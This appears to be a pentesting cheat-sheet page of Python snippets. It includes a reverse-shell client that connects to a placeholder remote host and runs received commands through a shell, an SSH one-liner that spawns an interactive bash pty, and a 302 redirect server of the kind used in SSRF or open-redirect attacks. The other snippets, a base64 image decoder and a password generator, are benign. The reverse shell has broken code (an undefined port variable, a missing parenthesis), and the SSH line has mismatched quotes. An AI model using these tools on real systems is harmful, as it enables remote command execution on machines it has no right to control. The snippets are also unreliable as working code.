# Python

{% tabs %}
{% tab title="Simple Reverse connection" %}
```python
import socket
import subprocess

REMOTE_HOST = '10.X.X.X'
REMOTE_HOST = 4231

client = socket.socket()
print ("Starting Connection..."

client.connect((REMOTE_HOST, REMOTE _PORT))
print ("Connected")

while True:
    print ("Command Awaiting")
    command = client.recv(1024)
    command = command.decode()
    
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    
    said = op.stdout.read()
    error_said = op.stderr.read()
    print("Send Response")
    client.send (said + error_said)
    
```
{% endtab %}

{% tab title="SSH login escape" %}
```python
ssh user@host "python -c \"import pty; pty.spawn('/bin/bash")\""
```
{% endtab %}

{% tab title="Base64 Web image decoder" %}
```python
# Save the data value to a text file (image.txt) and run the script below to generate an image. 

#!/bin/python
import base64

file = open('image.txt', 'rb')
encoded_data = file.read()
file.close()

decoded_data = base64.b64decode((encoded_data))

# Does not have to be png format

img_file = open('image.png','wb')
img_file.write(decoded_data)
img_file.close()
```
{% endtab %}

{% tab title="Password Generator" %}
```python
# Random Password generator. Insert additional characters as desired

import os

Characters = "aAbBcC3dDeEfFg9GHh2IiJjK8kLlM0m4N&nOoPpQq7RrSs1Tt#5UuVvWwXxYy6Zz"
Length = int(input("Length: "))

urandom = os.urandom(Length)
Index = ""
for i in range(Length):
    Index+=Characters[ord(os.urandom(1)) % len(Characters)]

print(Index)
```
{% endtab %}

{% tab title="Redirect.py" %}
```python
#!/usr/bin/python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', sys.argv[1])
      self.end_headers()

HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()
```
{% endtab %}
{% endtabs %}
